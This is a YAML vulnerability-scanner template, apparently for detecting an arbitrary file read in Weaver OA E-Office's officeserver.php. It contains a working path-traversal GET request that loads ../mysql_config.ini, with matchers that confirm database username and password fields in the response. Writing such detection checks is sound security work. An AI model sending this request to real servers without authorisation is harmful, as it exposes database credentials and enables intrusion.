id: "weaver-officeserver-lfi"
name: "OA E-Office officeserver.php Arbitrary File Read"
severity: "high"
description: "There is an arbitrary file reading vulnerability in the OA E-Office officeserver.php file. An attacker can download any file on the server through the vulnerability."
tech:
  - "php"
tags:
  - "weaver"
  - "e-cology"
  - "oa"
  - "lfi"
  - "vuln"
reference: "https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Office%20officeserver.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
spaExclusion: true
request:
  method: "GET"
  path: "/iweboffice/officeserver.php?OPTION=LOADFILE&FILENAME=../mysql_config.ini"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "datapassword ="
      - "datauser ="
    condition: "and"
  - type: "status"
    status:
      - 200
